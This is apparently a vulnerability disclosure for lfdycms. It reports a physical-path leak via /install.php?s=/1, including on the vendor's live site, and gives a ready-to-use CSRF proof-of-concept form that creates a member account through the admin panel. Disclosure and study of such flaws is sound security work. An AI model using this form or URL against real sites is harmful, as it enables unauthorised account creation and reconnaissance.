# Information_Disclosure
Direct access to the URL: `/install.php?s=/1`, you can see the physical path leaked.

![](https://github.com/AvaterXXX/CVEs/blob/master/images/lfdycms_Information-Disclosure_1-1.png)
The CMS official website is ` http://www.lfdycms.com`,the same problem exists.

Access URL:` http://www.lfdycms.com/install.php?s=/1`

![](https://github.com/AvaterXXX/CVEs/blob/master/images/lfdycms_Information-Disclosure_1-2.png)

-----------------------------------------------------

# CSRF

poc:

```
<html>
  <body>
    <form action="http://www.a.com:83/admin.php?s=/Member/add.html" method="POST">
      <input type="hidden" name="username" value="123456" />
      <input type="hidden" name="password" value="123456" />
      <input type="hidden" name="repassword" value="123456" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
